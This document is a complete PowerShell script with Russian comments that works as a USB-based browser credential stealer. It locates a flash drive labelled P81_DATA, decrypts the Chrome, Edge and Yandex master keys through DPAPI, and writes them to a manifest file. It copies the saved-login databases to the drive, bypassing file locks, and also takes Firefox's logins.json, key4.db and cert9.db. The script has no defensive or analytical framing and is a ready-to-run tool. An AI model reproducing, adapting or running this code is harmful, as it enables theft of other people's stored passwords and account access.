# 1. Поиск флешки по метке P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$usb = "$($u):"

# 2. Идентификация (Имя ПК + Юзер + Дата)
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$timestamp = Get-Date -f "yyyyMMdd_HHmm"
$dest = "$usb\P81_$($pc)_$($user)_$($timestamp)"
mkdir $dest -Force | Out-Null

# 3. Подготовка дешифровки ключей Chromium
Add-Type -AssemblyName System.Security
$report = "$dest\KEYS_MANIFEST.txt"

# 4. CHROMIUM ПУТИ (Chrome, Edge, Yandex)
$browsers = @(
    @{n="CHROME"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{n="EDGE";   p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    if (Test-Path $b.p) {
        # Сбор Master Key
        $ls = Join-Path $b.p "Local State"
        if (Test-Path $ls) {
            try {
                $json = Get-Content $ls -Raw | ConvertFrom-Json
                $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
                $dec = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
                "[$($b.n)] Key: $([Convert]::ToBase64String($dec))" >> $report
            } catch { "[$($b.n)] Key Error" >> $report }
        }

        # Сбор баз: Ищем стандартный Login Data и специфичный для Яндекса Ya Passman Data
        # Используем Include для обоих вариантов
        Get-ChildItem -Path $b.p -Include "Login Data", "Ya Passman Data" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $parentDir = $_.Directory.Name
            # Имя файла на флешке: BROWSER_ПАПКА_ИМЯ.db
            $targetName = "$($b.n)_$($parentDir)_$($_.Name).db"
            
            # Агрессивное копирование через CMD (обход блокировок)
            cmd /c copy /y "`"$($_.FullName)`"" "`"$dest\$targetName`"" > $null
        }
    }
}

# 5. ПРЯМОЙ УДАР (если рекурсия не сработала на Яндексе)
$yPath = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Ya Passman Data"
if (Test-Path $yPath) {
    $yDest = "$dest\YANDEX_DIRECT_Passman.db"
    try {
        $source = [System.IO.File]::Open($yPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $target = [System.IO.File]::Create($yDest)
        $source.CopyTo($target)
        $source.Close(); $target.Close()
    } catch {
        cmd /c copy /y "`"$yPath`"" "`"$yDest`"" > $null
    }
}

# 6. FIREFOX (logins, key4, cert9)
$ffDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffDir) {
    Get-ChildItem $ffDir -Directory | ForEach-Object {
        $p = $_.Name
        foreach ($f in "logins.json", "key4.db", "cert9.db") {
            $src = Join-Path $_.FullName $f
            if (Test-Path $src) {
                Copy-Item $src -Destination "$dest\FIREFOX_$($p)_$f" -Force
            }
        }
    }
}

exit
